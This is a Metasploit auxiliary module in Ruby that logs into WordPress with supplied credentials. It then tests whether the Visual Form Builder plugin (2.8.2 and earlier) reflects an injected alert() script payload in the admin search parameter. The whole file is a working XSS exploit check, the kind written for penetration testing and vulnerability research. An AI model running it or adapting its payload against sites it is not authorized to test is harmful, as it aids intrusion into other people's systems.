##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'WordPress Visual Form Builder Plugin XSS Scanner',
      'Description' => %q{
      This module attempts to exploit a authenticated Cross-Site Scripting in Visual Form Builder
      Plugin for WordPress, version 2.8.2 and likely prior in order if the instance is vulnerable.
      },
      'Author'      =>
        [
          'Tim Coen', # Vulnerability Discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['WPVDB', '7991'],
          ['URL', 'http://software-talk.org/blog/2015/05/sql-injection-reflected-xss-visual-form-builder-wordpress-plugin/']
        ],
      'DisclosureDate' => 'May 15 2015'
    ))

    register_options(
      [
        OptString.new('WP_USER', [true, 'A valid username', nil]),
        OptString.new('WP_PASSWORD', [true, 'Valid password for the provided username', nil])
      ], self.class)
  end

  def check
    check_plugin_version_from_readme('visual-form-builder', '2.8.3')
  end

  def user
    datastore['WP_USER']
  end

  def password
    datastore['WP_PASSWORD']
  end

  def run_host(ip)
    print_status("#{peer} - Trying to login as #{user}")
    cookie = wordpress_login(user, password)
    if cookie.nil?
      print_error("#{peer} - Unable to login as #{user}")
      return
    end
    print_good("#{peer} - Login successful")

    xss = Rex::Text.rand_text_numeric(8)
    xss_payload = '><script>alert(' + "#{xss}" + ');</script>'

    res = send_request_cgi(
      'uri'       => normalize_uri(wordpress_url_backend, 'admin.php'),
      'vars_get'  => {
        'page'    => 'visual-form-builder',
        's'       => "#{xss_payload}"
      },
      'cookie'      => cookie
    )

    unless res && res.body
      print_error("#{peer} - Server did not respond in an expected way")
      return
    end

    if res.code == 200 && res.body =~ /#{xss}/
      print_good("#{peer} - Vulnerable to Cross-Site Scripting the \"Visual Form Builder 2.8.2\" plugin for WordPress")
      p = store_local('wp_visualform.http', 'text/html', res.body, "#{xss}")
      print_good("Save in: #{p}")
    else
      print_error("#{peer} - Failed, maybe the target isn't vulnerable.")
    end
  end
end
